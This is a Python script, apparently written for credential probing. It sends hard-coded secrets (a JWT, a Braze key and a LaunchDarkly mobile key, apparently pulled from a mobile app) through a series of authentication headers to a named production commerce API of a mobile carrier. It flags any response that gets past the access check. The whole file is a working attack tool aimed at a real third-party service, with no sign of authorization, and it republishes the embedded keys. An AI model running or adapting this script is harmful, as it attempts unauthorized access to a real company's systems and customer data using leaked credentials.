#!/usr/bin/env python3
"""
Commerce API Header Fuzzer
Attempts to find the correct header that triggers a different response
"""

import requests
import json
from rich.console import Console

console = Console()

SECRETS = {
    'MINT_JWT': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MDc3NjY4MjQsIm5iZiI6MTUwNzc2NjgyNCwiZXhwIjoxNTk0MDgwNDI0LCJhdWQiOiJNaW50QXBwIiwiaXNzIjoiVUxUUkEifQ.r909IZmcavEhqvZO0td_-Ts_q27BBk4cCbFRXpDBQUM',
    'BRAZE': '8cad9a3e-60eb-47ab-b782-22b33974568c',
    'LD_KEY': 'mob-82856bdd-1e79-4d98-a55f-be43b733543b'
}

URL = "https://commerce-api.ultramobile.com/v1/mint"

HEADERS_TO_TEST = [
    'Authorization',
    'x-access-token',
    'x-mint-token',
    'x-ultra-token',
    'x-api-key',
    'token',
    'bearer',
    'X-App-Id',
    'X-App-Version'
]

def fuzz_headers():
    for header in HEADERS_TO_TEST:
        # Test with JWT
        try:
            val = f"Bearer {SECRETS['MINT_JWT']}" if header == 'Authorization' else SECRETS['MINT_JWT']
            r = requests.get(URL, headers={header: val}, timeout=10)
            console.print(f"[yellow]{header}[/yellow]: {r.status_code} - {r.text[:50]}")
            if "Bad access token" not in r.text and r.status_code != 403:
                console.print(f"[red]🎯 INTERESTING RESPONSE WITH {header}![/red]")
        except: pass

        # Test with Braze Key (as a fallback)
        try:
            r = requests.get(URL, headers={header: SECRETS['BRAZE']}, timeout=10)
            if r.status_code != 403:
                console.print(f"[yellow]{header} (Braze):[/yellow] {r.status_code} - {r.text[:50]}")
        except: pass

if __name__ == "__main__":
    fuzz_headers()
